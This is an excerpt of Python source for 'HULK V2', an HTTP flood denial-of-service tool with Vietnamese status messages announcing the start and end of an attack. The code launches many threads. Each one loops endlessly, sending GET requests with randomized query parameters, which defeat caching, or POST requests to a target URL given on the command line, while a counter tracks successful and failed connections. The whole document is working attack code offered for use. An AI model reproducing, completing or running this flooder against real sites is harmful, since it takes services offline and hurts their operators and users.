...
def httpcall(url, host, data, headers, s):
  global cur
  ...
  while True:
    try:
      if data == "":
        q = requests.get(url + param_joiner +
                         buildblock(random.randint(3, 10)) + "=" +
                         buildblock(random.randint(3, 10)),
                         headers=headers)
      else:
        q = requests.post(url, data=data, headers=headers)
...
def attack(url):
  ...
  print(f"  -- Đã bắt đầu tấn công  --\n     HULK V2\n\n")
  ss = queue.Queue()
  err = 0
  sent = 0
  print(
      "    Đang sử dụng             |\tKết nối thành công |\tKết nối thất bại")

  for _ in range(maxproc):
    t = threading.Thread(target=httpcall, args=(site, u, "", {}, ss))
    t.start()
  ...
  while True:
    ...
    if sent % 10 == 0:
      print(f"\r  {cur} trong số tối đa {maxproc} |\t{sent} |\t{err}", end='')

    switch = ss.get()

    if switch == callExitOnErr:
      cur -= 1
      err += 1
    elif switch == callGotOk:
      sent += 1
    elif switch == targetComplete:
      sent += 1
      print("\r  -- Đã kết thúc cuộc tấn công --       \n\n\r")
      sys.exit(0)


if __name__ == "__main__":
  if len(sys.argv) != 2:
    print("Usage: python hulk.py <target_url>")
    sys.exit(1)
